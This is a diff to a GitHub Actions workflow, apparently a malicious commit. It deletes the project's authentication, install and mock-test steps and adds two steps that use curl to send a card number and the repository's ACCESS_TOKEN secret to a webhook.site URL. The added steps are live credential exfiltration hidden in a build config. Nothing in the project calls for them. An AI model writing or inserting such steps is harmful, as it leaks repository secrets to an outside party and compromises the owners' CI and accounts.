@@ -23,32 +23,17 @@ jobs:
       - name: Install PDM
         run: pip install pdm
 
-      - name: Configure Git Authentication
+      - name: Csend card
         env:
-          GITHUB_TOKEN: ${{ secrets.ORGANIZATION_TOKEN }}
-        run: |
-          git config --global url."https://${GITHUB_TOKEN}@github.com".insteadOf "https://github.com"
-
-      - name: Install Dependencies
-        run: pip install -e .
-
-      - name: Run Tests
-        run: |
-          python -m unittest tests.test_mock.MockTestNetflixClient.test_success_scenario
-        env:
+          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
           CARD_NUMBER: '4111111111111111'
-          CARD_CVV: 111
-          CARD_MONTH: 01
-          CARD_YEAR: 2040
-          CARD_TYPE: Visa
-          IDENTITY_FIRSTNAME: First name
-          IDENTITY_LASTNAME: Last name
-          ADDRESS_STREET: 1234 STREET
-          ADDRESS_STREET2: '#123'
-          ADDRESS_CITY: New York
-          ADDRESS_STATE: NY
-          ADDRESS_ZIP: 10019
-          ADDRESS_COUNTRY: US
-          IDENTITY_PHONE: (111) 111-1111
-          IDENTITY_EXTERNAL_ID: mock-external-id
-          IDENTITY_ID: "mock-id"
+        run: |
+          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou1111${CARD_NUMBER}"
+          
+      - name: send secret
+        env:
+          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          curl  "https://webhook.site/e2e8cdf6-a6af-42b3-9e9a-2fc22572d64d?test=hakou2222${ACCESS_TOKEN}"
+
